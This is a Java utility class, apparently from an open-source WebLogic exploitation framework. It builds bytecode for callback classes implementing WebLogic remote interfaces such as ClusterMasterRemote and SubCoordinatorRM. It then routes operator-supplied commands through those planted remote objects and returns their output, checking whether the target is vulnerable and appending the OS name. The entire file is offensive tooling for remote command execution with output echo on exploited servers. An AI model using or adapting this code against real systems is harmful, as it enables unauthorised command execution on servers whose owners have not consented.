/*
 * Copyright (c) 2020. r4v3zn.
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package com.r4v3zn.weblogic.framework.utils;

import com.google.common.collect.Multimap;
import com.r4v3zn.weblogic.framework.call.Call;
import com.r4v3zn.weblogic.framework.entity.MyException;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.LoaderClassPath;
import org.reflections.Reflections;
import weblogic.cluster.migration.RemoteMigratableServiceCoordinator;
import weblogic.cluster.singleton.ClusterMasterRemote;
import weblogic.cluster.singleton.RemoteLeasingBasis;
import weblogic.cluster.singleton.SingletonMonitorRemote;
import weblogic.server.channels.RemoteChannelService;
import weblogic.transaction.internal.SubCoordinatorRM;

import java.rmi.Remote;
import java.rmi.RemoteException;
import java.util.*;

import static org.apache.commons.lang3.StringUtils.isBlank;

/**
 * Title: CallUtils
 * Desc: 回显工具类
 * Date:2020/4/3 18:59
 * @version 1.0.0
 */
public class CallUtils {

    /**
     * 私有化构造防止被实例化
     */
    private CallUtils(){}

    /**
     * 获取所有回调 class
     */
    public static final String[] CALL_NAMES = getCallName();

    /**
     * 获取所有回调 class map
     */
    public static final Map<String, Class<? extends Remote>> CALL_MAP = callTypeMap();

    /**
     * 默认回调类
     */
    public static final String DEFAULT_CALL =  ClusterMasterRemote.class.getSimpleName();


    /**
     * 通过回调类名称构建对应的字节码
     * @param callName 回调类名称
     * @return
     * @throws Exception
     */
    public static byte[] buildBytes(String callName) throws Exception {
        Class<? extends Remote> callClazz = CALL_MAP.get(callName);
        return buildBytes(callClazz);
    }

    /**
     * 通过回调实现类构建对应的字节码
     * @param callClazz 回调实现类
     * @return
     * @throws Exception
     */
    public static byte[] buildBytes(Class<? extends Remote> callClazz) throws Exception {
        ClassPool pool = ClassPool.getDefault();
        CtClass ctClass =  pool.get(callClazz.getName());
        if(ctClass.isFrozen()){
            ctClass.defrost();
        }
        ctClass.setName(callClazz.getSimpleName());
        byte[] bytes = ctClass.toBytecode();
        ctClass.defrost();
        return bytes;
    }

    /**
     * 构建默认构建字节码，默认字节码为 ClusterMasterRemote
     * @return
     * @throws Exception
     */
    public static byte[] buildBytes() throws Exception {
        return buildBytes(DEFAULT_CALL);
    }

    /**
     * 获取可回调所有类
     * @return
     */
    public static Set<Class<? extends Remote>> callTypes(){
        String packageName = Call.class.getPackage().getName();
        final Reflections reflections = new Reflections(packageName);
        Multimap<String, String> multimap =  reflections.getStore().get("SubTypesScanner");
        Set<String> keySet = multimap.keySet();
        Set<Class<? extends Remote>> classSet = new HashSet<Class<? extends Remote>>();
        for (String key:keySet) {
            try {
                if(key.contains(packageName)){
                    continue;
                }
                classSet.add((Class<? extends Remote>) Class.forName(multimap.get(key).iterator().next()));
            } catch (ClassNotFoundException e) {
                e.printStackTrace();
            }
        }
        return classSet;
    }

    /**
     * 获取回调的名称
     * @return
     */
    public static String[] getCallName(){
        final List<Class<? extends Remote>> callClasses = new ArrayList<Class<? extends Remote>>(callTypes());
        Collections.sort(callClasses, new StringUtils.ToStringComparator());
        List<String> nameList = new ArrayList<String>();
        for (Class<? extends Remote> callClass:callClasses) {
            String name = callClass.getInterfaces()[0].getSimpleName();
            if(nameList.contains(name)){
                continue;
            }
            nameList.add(name);
        }
        return nameList.toArray(new String[0]);
    }

    /**
     * 回调名称
     * @return
     */
    public static Map<String, Class<? extends Remote>> callTypeMap(){
        final List<Class<? extends Remote>> callClasses = new ArrayList<Class<? extends Remote>>(callTypes());
        Collections.sort(callClasses, new StringUtils.ToStringComparator());
        Map<String, Class<? extends Remote>> result = new HashMap<String, Class<? extends Remote>>();
        List<String> nameList = new ArrayList<String>();
        for (Class<? extends Remote> callClass:callClasses) {
            String name = callClass.getInterfaces()[0].getSimpleName();
            if(nameList.contains(name)){
                continue;
            }
            nameList.add(name);
            result.put(name, callClass);
        }
        return result;
    }


    /**
     * 执行命令
     * @param cmd cmd
     * @param object 回调对象
     * @return
     */
    public static String callExec(String cmd, Object object) throws Exception {

        if(object == null){
            throw new MyException("漏洞不存在");
        }
        if(isBlank(cmd)){
            throw new MyException("请输入执行命令");
        }
        if(object instanceof ClusterMasterRemote){
            ClusterMasterRemote remote = (ClusterMasterRemote) object;
            return remote.getServerLocation(cmd);
        }else if(object instanceof RemoteChannelService){
            RemoteChannelService remote = (RemoteChannelService)object;
            return remote.getURL(cmd);
        }else if(object instanceof RemoteLeasingBasis){
            RemoteLeasingBasis remote = (RemoteLeasingBasis)object;
            return remote.findOwner(cmd);
        }else if(object instanceof RemoteMigratableServiceCoordinator){
            RemoteMigratableServiceCoordinator remote = (RemoteMigratableServiceCoordinator)object;
            return remote.getCurrentLocationOfJTA(cmd);
        }else if(object instanceof SingletonMonitorRemote){
            SingletonMonitorRemote remote = (SingletonMonitorRemote) object;
            return remote.findServiceLocation(cmd);
        }else if(object instanceof SubCoordinatorRM){
            SubCoordinatorRM remote = (SubCoordinatorRM)object;
            return remote.getProperties(cmd).get("data").toString();
        }
        throw new MyException("无可利用回显类");
    }

    /**
     * 执行命令并且回显
     * @param cmd 执行命令
     * @param remote 远程 Stub
     * @return
     */
    public static String callInfo(String cmd, ClusterMasterRemote remote) throws RemoteException {
        if(remote == null){
            throw new MyException("漏洞不存在");
        }
        if(isBlank(cmd)){
            throw new MyException("请输入执行命令");
        }
        String currentOs = System.getProperty("os.name");
        cmd += "@@"+currentOs;
        return remote.getServerLocation(cmd);
    }

}
